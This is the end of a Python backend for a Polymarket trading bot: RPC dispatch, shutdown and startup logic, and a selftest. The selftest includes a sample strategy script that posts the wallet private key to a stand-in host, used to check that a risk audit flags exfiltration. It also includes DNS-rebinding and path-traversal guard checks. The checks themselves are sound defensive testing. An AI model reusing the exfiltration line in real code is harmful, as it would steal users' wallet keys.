    "scriptSetEnabled": _h_script_set_enabled,
    "scriptSetAssets": _h_script_set_assets,
    "scriptSetDryRun": _h_script_set_dry_run,
    "scriptShadowOrders": _h_script_shadow_orders,
    "scriptValidate": _h_script_validate,
    "scriptBacktest": _h_script_backtest,
    "scriptContextPack": _h_script_context_pack,
    "scriptApiDocs": _h_script_api_docs,
    "copyStatus": _h_copyStatus,
    "polymarketUrl": _h_polymarketUrl,
    "terminalDiscover": _h_terminal_discover,
    "terminalSearch": _h_terminal_search,
    "terminalMarket": _h_terminal_market,
    "terminalBook": _h_terminal_book,
    "terminalHistory": _h_terminal_history,
    "terminalTape": _h_terminal_tape,
    "terminalResolution": _h_terminal_resolution,
    "terminalMicro": _h_terminal_micro,
    "terminalRelated": _h_terminal_related,
    "terminalCrossVenue": _h_terminal_cross_venue,
    "remoteStatus": _h_remote_status,
    "remoteSetToken": _h_remote_set_token,
    "remotePairCode": _h_remote_pair_code,
    "remoteAddPaired": _h_remote_add_paired,
    "remoteUnpair": _h_remote_unpair,
    "remoteSync": _h_remote_sync,
    "mcpStatus": _h_mcp_status,
    "mcpSync": _h_mcp_sync,
    "mcpRotateToken": _h_mcp_rotate_token,
    "mcpRevealToken": _h_mcp_reveal_token,
    "mcpPaper": _h_mcp_paper,
    "remoteTest": _h_remote_test,
    "terminalHealth": _h_terminal_health,
    "terminalWatchlist": _h_terminal_watchlist,
    "terminalPreview": _h_terminal_preview,
    "terminalPlace": _h_terminal_place,
    "terminalCancel": _h_terminal_cancel,
    "terminalOrders": _h_terminal_orders,
    "terminalPortfolio": _h_terminal_portfolio,
    "terminalSettled": _h_terminal_settled,
    "terminalFills": _h_terminal_fills,
    "terminalOrderLog": _h_terminal_order_log,
    "terminalReconcile": _h_terminal_reconcile,
    "terminalStanding": _h_terminal_standing,
    "terminalFlattenWallet": _h_terminal_flatten_wallet,
    "terminalSellPreview": _h_terminal_sell_preview,
    "terminalSellPosition": _h_terminal_sell_position,
    "terminalPaperPlace": _h_terminal_paper_place,
    "terminalPaperPortfolio": _h_terminal_paper_portfolio,
    "terminalPaperOrders": _h_terminal_paper_orders,
    "terminalPaperCancel": _h_terminal_paper_cancel,
    "terminalPaperReset": _h_terminal_paper_reset,
    "setConfig": _h_setConfig,
    "setCredentials": _h_setCredentials,
    "clearCredentials": _h_clearCredentials,
    "credentialStatus": _h_credentialStatus,
    "testCredentials": _h_testCredentials,
    "account": _h_account,
    "pnlSeries": _h_pnlSeries,
    "positions": _h_positions,
    "signals": _h_signals,
    "scannerStats": _h_scannerStats,
    "cancelAllOpen": _h_cancelAllOpen,
    "flatten": _h_flatten,
    "runOnce": _h_runOnce,
    "pause": _h_pause,
    "shutdown": _h_shutdown,
    "botRuns": _h_botRuns,
    "factoryReset": _h_factoryReset,
    "clearHistory": _h_clearHistory,
}


def _sync_terminal_offline() -> None:
    try:
        import terminal
        cfg = STATE.cfg or {}
        terminal.set_offline(bool(cfg.get("terminal_offline_mode", False)))
    except Exception:
        pass


async def _dispatch_request(req: dict) -> None:
    rid = req.get("id", "")
    method = req.get("method", "")
    params = req.get("params") or {}
    if method.startswith("terminal"):
        _sync_terminal_offline()
    h = _HANDLERS.get(method)
    if not h:
        await respond_err(rid, f"unknown method: {method}")
        return
    try:
        result = await h(params)
        await respond_ok(rid, result)
    except Exception as e:
        logger.debug(
            f"RPC {method} failed: {e}\n{traceback.format_exc(limit=3)}"
        )
        await respond_err(rid, f"{type(e).__name__}: {e}")


async def _stdin_reader() -> None:
    loop = asyncio.get_event_loop()

    def _readline() -> str:
        return sys.stdin.readline()

    while True:
        line = await loop.run_in_executor(None, _readline)
        if not line:
            await asyncio.sleep(0.1)
            await _shutdown()
            return
        line = line.strip()
        if not line:
            continue
        try:
            req = json.loads(line)
        except Exception:
            continue
        if not isinstance(req, dict):
            continue
        if req.get("type") != "rpc":
            continue
        t = asyncio.create_task(_dispatch_request(req))
        _bg_tasks.add(t)
        t.add_done_callback(_bg_tasks.discard)


_shutting_down = False


async def _shutdown() -> None:
    global _shutting_down
    if _shutting_down:
        return
    _shutting_down = True
    try:
        await _stop_loop()
    except Exception:
        pass
    try:
        if STATE.auth_ok:
            n = await trader.cancel_all_resting_orders("shutdown")
            if n:
                logger.info(f"Shutdown: canceled {n} resting order(s)")
    except Exception as e:
        logger.warning(f"shutdown cancel-resting failed: {e}")
    try:
        import bot_discord
        import bot_telegram
        await bot_discord.stop()
        await bot_telegram.stop()
    except Exception:
        pass
    try:
        import mcp_server
        await mcp_server.stop()
    except Exception:
        pass
    try:
        import terminal
        await terminal.stop_recorder()
    except Exception:
        pass
    try:
        await spot_ws.stop()
    except Exception:
        pass
    try:
        await rtds_ws.stop()
    except Exception:
        pass
    try:
        if STATE.active_run_id:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
            STATE.active_run_id = 0
    except Exception:
        pass
    try:
        await polymarket_api.close_clients()
    except Exception:
        pass
    try:
        await crypto15m.close_clients()
    except Exception:
        pass
    try:
        await perps_maker.shutdown()
        await perps_api.close_clients()
        await perps_ws.feed.stop()
    except Exception:
        pass
    try:
        await user_ws.feed.stop()
        await data_v2.close_clients()
    except Exception:
        pass
    try:
        import clob_ws
        await clob_ws.feed.stop()
    except Exception:
        pass
    try:
        import instance_lock
        for env_name in ("mainnet", "testnet"):
            try:
                addr = polymarket_auth.trading_address(env_name)
                if addr:
                    instance_lock.release(addr)
            except Exception:
                pass
    except Exception:
        pass
    await emit_event("backend:shutdown", {})
    sys.stdout.flush()
    await asyncio.sleep(0.1)
    os._exit(0)


async def _startup_authed_sync() -> tuple[Any, Any]:
    try:
        n = await trader.cancel_all_resting_orders("startup stale-order sweep")
        if n:
            logger.info(f"Startup: canceled {n} stale resting order(s)")
    except Exception as e:
        logger.warning(f"startup cancel-resting failed: {e}")

    reconcile_res, balance_res = await asyncio.gather(
        trader.reconcile_positions_with_polymarket(),
        trader.refresh_balance(STATE.cfg, force=True),
        return_exceptions=True,
    )
    return reconcile_res, balance_res


async def _main() -> None:
    sys.stdout = io.TextIOWrapper(
        sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True
    )
    STATE.started_at = datetime.now(timezone.utc).isoformat()
    db.init_db()
    crypto15m_trader.set_auto_off_callback(_on_crypto15m_auto_off)
    script_engine.set_event_callback(emit_event)
    logger.info("Krypt PolyBot backend starting")

    stdin_task = asyncio.create_task(_stdin_reader(), name="stdin_reader")

    active_env = STATE.cfg.get("network", "mainnet")
    try:
        polymarket_auth.set_env(active_env)
    except Exception:
        pass
    try:
        if polymarket_auth.migrate_legacy_credentials(active_env):
            logger.info(f"Migrated legacy credentials → {active_env}")
    except Exception as e:
        logger.warning(f"legacy credential migration failed: {e}")

    if polymarket_auth.credentials_present(active_env):
        STATE.auth_ok = await _establish_auth()
        if STATE.auth_ok:
            logger.info("Saved credentials verified")

    await emit_event("backend:ready", {"startedAt": STATE.started_at})
    await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})
    try:
        await emit_event(
            "credentials:changed", polymarket_auth.credentials_status_all(),
        )
    except Exception:
        pass

    reconcile_res: Any = None
    balance_res: Any = None
    if STATE.auth_ok:
        reconcile_res, balance_res = await _startup_authed_sync()

    if STATE.auth_ok:
        try:
            if isinstance(reconcile_res, BaseException):
                raise reconcile_res
            summary, changed = reconcile_res
            if any(summary.values()):
                logger.info(f"Eager startup reconcile: {summary}")
            await emit_event("backend:reconciled", summary)
            for row in changed:
                await emit_event("position:update", _position_row_to_js(row))
        except Exception as e:
            logger.warning(f"eager startup reconcile failed: {e}")

    if STATE.auth_ok:
        try:
            if isinstance(balance_res, BaseException):
                raise balance_res
            cents, port = balance_res
            env_now = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env_now)
                STATE.active_run_id = db.start_bot_run(
                    conn,
                    env=env_now,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started "
                f"(env={env_now}, "
                f"start_total=${(cents + port) / 100.0:.2f})"
            )
        except Exception as e:
            logger.warning(f"could not open bot_run: {e}")

    await _start_loop()
    try:
        await stdin_task
    except Exception as e:
        logger.error(f"reader crashed: {e}")
    finally:
        await _shutdown()


_PERPS_REF_OP = ["createOrders", [[1, True, "65000", "0.01", "ioc", False, None,
                                   "7f9e4a2b6c8d0e1f1234567890abcdef", None]]]
_PERPS_REF_HASH = "0x33c8d67201940ff3138d7b500e8bd27b8dfe0fd13131546f8d76de1acdb5d46c"


def _perps_hash_check() -> None:
    got = perps_api.hash_op(_PERPS_REF_OP)
    assert got == _PERPS_REF_HASH, f"perps op hash drifted: {got}"


def _selftest() -> int:
    checks: list[tuple[str, bool, str]] = []

    def _try(name: str, fn) -> None:
        try:
            fn()
            checks.append((name, True, ""))
        except Exception as e:
            checks.append((name, False, f"{type(e).__name__}: {e}"))

    _try("import eth_account", lambda: __import__("eth_account"))
    _try("import httpx", lambda: __import__("httpx"))
    _try("import cryptography", lambda: __import__("cryptography"))
    _try("sign POLY_1271 order (offline)", polymarket_auth.verify_signer)
    _try("import websockets (CLOB WS feed)", lambda: __import__("websockets"))
    _try("import clob_ws", lambda: __import__("clob_ws"))
    _try("import indicators + compute", lambda: __import__("indicators").compute([1.0, 2.0]))
    _try("import spot_ws (Coinbase spot feed)", lambda: __import__("spot_ws"))
    _try("import rtds_ws (RTDS Chainlink feed)", lambda: __import__("rtds_ws"))
    _try("import activity_ws (RTDS trade tape)", lambda: __import__("activity_ws"))
    _try("import replay (backtest engine)", lambda: __import__("replay"))
    _try("import parlay_generator", lambda: __import__("parlay_generator"))
    _try("perps op hash (msgpack + keccak)", lambda: _perps_hash_check())
    _try("import perps_backtest", lambda: __import__("perps_backtest"))
    _try("import user_ws (CLOB user feed)", lambda: __import__("user_ws").UserFeed().handle(
        {"event_type": "order", "id": "x", "status": "LIVE"}))
    _try("import binance_ref (hourly series)", lambda: __import__("binance_ref").hourly_slug(
        "BTC", 1791194400))
    _try("import perps_ws", lambda: __import__("perps_ws").parse_bbo(
        {"ch": "bbo::1", "data": {"iid": 1, "bp": "1", "ap": "2"}}))
    _try("model math (settlement sniper)", lambda: (
        __import__("crypto15m").model_up_prob(101.0, 100.0, 0.001, 5.0)))

    def _script_runtime_check() -> None:
        ss = __import__("script_sandbox")
        good = ("def decide(ctx):\n"
                "    return {\"side\": \"up\", \"price\": \"ask\"}\n")
        mod = ss.CompiledScript("selftest", good)
        intent = mod.call("decide", {"minsLeft": 1.0})
        assert intent and intent.get("side") == "up", "decide() lost its intent"
        assert not ss.validate("import os\ndef decide(ctx):\n    return None"), \
            "validator rejected an import (scripts are unsandboxed now)"
        assert ss.validate("def nope(ctx):\n    return None\n"), \
            "validator accepted a script with no entry hook"
        try:
            bad = ss.CompiledScript(
                "selftest2",
                "def decide(ctx):\n"
                "    while True:\n        pass\n", traced=True)
            bad.call("decide", {}, budget_ms=50.0)
            raise AssertionError("budget did not kill a busy loop")
        except ss.ScriptBudgetExceeded:
            pass

    def _audit_check() -> None:
        sa = __import__("script_audit")
        clean = sa.audit(
            "def decide(ctx):\n    return None\n")
        assert clean["ok"] and not clean["findings"], \
            "audit flagged a plain strategy"
        evil = sa.audit(
            "import requests\n"
            "import polymarket_auth\n"
            "def decide(ctx):\n"
            "    requests.post('https://x.example', json=polymarket_auth.private_key)\n"
            "    return None\n")
        assert not evil["ok"] and evil["critical"] >= 3, \
            f"audit missed an exfiltration script: {evil}"
        assert "exfiltration" in evil["categories"], \
            "audit missed the wallet+network combination rule"

    _try("user scripts (compile / run / runaway guard)", _script_runtime_check)
    _try("script risk audit", _audit_check)
    _try("import script_backtest", lambda: __import__("script_backtest"))
    _try("import script_engine", lambda: __import__("script_engine"))
    _try("import script_audit", lambda: __import__("script_audit"))
    _try("import script_docs", lambda: __import__("script_docs"))

    _try("import terminal (provider layer)", lambda: __import__("terminal"))
    _try("import terminal_trade (manual orders)",
         lambda: __import__("terminal_trade"))
    _try("import terminal_paper (paper trading)",
         lambda: __import__("terminal_paper"))
    _try("import kalshi (second venue, read-only)", lambda: __import__("kalshi"))
    _try("import remote (chat command brain)", lambda: __import__("remote"))
    _try("import bot_telegram", lambda: __import__("bot_telegram"))
    _try("import bot_discord", lambda: __import__("bot_discord"))
    _try("import bot_secrets", lambda: __import__("bot_secrets"))

    def _remote_auth_check() -> None:
        r = __import__("remote")
        assert not r.is_allowed("discord", "999999"),             "an unpaired id was allowed"
        assert not r.is_allowed("telegram", ""), "an empty id was allowed"
        assert not r.trading_allowed({"remote_enabled": True}),             "remote trading allowed without its own switch"
        assert not r.trading_allowed({"remote_trading_enabled": True}),             "remote trading allowed while remote itself is off"
        assert r.trading_allowed(
            {"remote_enabled": True, "remote_trading_enabled": True})
        bs = __import__("bot_secrets")
        try:
            bs._path("../../evil")
            raise AssertionError("bot_secrets accepted an arbitrary platform")
        except ValueError:
            pass

    _try("remote auth + trading gate", _remote_auth_check)
    _try("import cross_venue", lambda: __import__("cross_venue"))

    def _cross_venue_polarity_check() -> None:
        t = __import__("terminal")
        assert t.polarity("Fed will increase rates") == "up"
        assert t.polarity("Fed will cut rates") == "down"
        assert t.polarity("Bitcoin Up or Down") is None,             "a two-directional title must claim no direction"
        assert t._are_opposites(
            "Will the Fed increase rates by 25 bps",
            "Will the Federal Reserve Cut rates by 25bps"),             "increase/cut was not recognised as opposite"
        cv = __import__("cross_venue")
        score, _, _ = cv.score_pair(
            {"title": "Will the Fed increase rates by 25 bps", "closeTime": None},
            {"matchText": "Will the Federal Reserve Cut rates by 25bps Cut 25bps"})
        assert score == 0.0, f"opposite questions scored {score}"

    _try("cross-venue polarity guard", _cross_venue_polarity_check)

    _try("import ai_secrets", lambda: __import__("ai_secrets"))
    _try("import ai_analysis", lambda: __import__("ai_analysis"))
    _try("import anthropic SDK", lambda: __import__("anthropic"))
    _try("import openai SDK", lambda: __import__("openai"))

    def _ai_no_estimate_check() -> None:
        ai = __import__("ai_analysis")
        assert ai._SCHEMA.get("additionalProperties") is False,             "AI response schema is open — the model could invent a probability field"
        for name, spec in ai._SCHEMA["properties"].items():
            assert spec.get("type") not in ("number", "integer"),                 f"AI response schema exposes a numeric field: {name}"
        assert ai._SCHEMA["properties"]["lean"]["enum"] == [
            "cheap", "rich", "fair", "no_view"], "AI lean vocabulary changed"
        gone, n = ai._strip_numeric_estimates("I'd put it at 70%.")
        assert n == 1 and not gone, "model estimate survived the scrubber"
        kept, n = ai._strip_numeric_estimates("CPI came in at 2.4% in August.")
        assert n == 0 and kept, "the scrubber ate a fact about the world"
        payload = ai.build_payload({
            "question": "Q?", "_raw": {"description": "rules"},
            "myPosition": {"contracts": 500}, "walletAddress": "0xdead",
        })
        blob = __import__("json").dumps(payload).lower()
        for token in ("position", "wallet", "contracts", "balance"):
            assert token not in blob, f"AI payload leaked {token!r}"

    _try("AI analysis: no-estimate + no-account-leak", _ai_no_estimate_check)

    def _terminal_honesty_check() -> None:
        t = __import__("terminal")
        assert t.num("") is None and t.num(None) is None and t.num("x") is None,             "num() coerced an unknown to a number"
        assert t.num(0) == 0.0, "num() lost a real zero"
        assert t.cents(0.42) == 42.0, "cents() mis-scaled a probability"

        rows = [
            {"volume24hUsd": 100.0, "category": "crypto", "title": "a"},
            {"volume24hUsd": None, "category": "crypto", "title": "b"},
            {"volume24hUsd": 5000.0, "category": None, "title": "c"},
        ]
        kept, skipped, excluded = t.apply_filters(rows, {"minVolume24hUsd": 50})
        assert len(kept) == 2 and skipped == 1 and excluded == 0,             f"numeric filter must SKIP an unknown, got {kept=} {skipped=}"
        kept, skipped, excluded = t.apply_filters(rows, {"categories": ["crypto"]})
        assert len(kept) == 2 and excluded == 1,             "categorical filter must EXCLUDE an unknown category"

        pts = t._dedupe_points(
            [{"t": 2, "p": 2.0}, {"t": 1, "p": 1.0}, {"t": 2, "p": 3.0}])
        assert [x["t"] for x in pts] == [1, 2], "history not sorted/collapsed"

    _try("terminal honest-null + filter rules", _terminal_honesty_check)

    def _mcp_check() -> None:
        srv = __import__("mcp_server")
        tools = __import__("mcp_tools")
        __import__("mcp_stdio")
        listed = {t["name"]: t for t in tools.list_tools()}
        for name in ("get_status", "place_order", "backtest_crypto15m",
                     "save_script", "pause_all_engines", "update_config",
                     "research_data", "close_position"):
            assert name in listed, f"MCP tool missing: {name}"
        assert len(listed) <= 40, "over 40 MCP tools — some clients drop the rest"
        assert listed["place_order"]["inputSchema"]["required"][0] == "mode",             "place_order must not default its mode"
        assert srv._host_ok("127.0.0.1:47615") and srv._host_ok("localhost")
        assert not srv._host_ok("evil.example:47615"), "DNS-rebinding guard regressed"
        cfg = {"mcp_live_trading_enabled": False, "mcp_scripts_enabled": False}
        for gate in ("live", "scripts"):
            try:
                tools._require(cfg, gate)
            except tools.Refused:
                continue
            raise AssertionError(f"MCP '{gate}' gate is open with its switch off")

    _try("MCP server: tools, loopback guard, gates", _mcp_check)

    ok = all(c[1] for c in checks)
    print("=== krypt-polybot backend selftest ===")
    for name, passed, err in checks:
        print(f"  [{'OK  ' if passed else 'FAIL'}] {name}{('  -> ' + err) if err else ''}")
    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        sys.exit(_selftest())
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
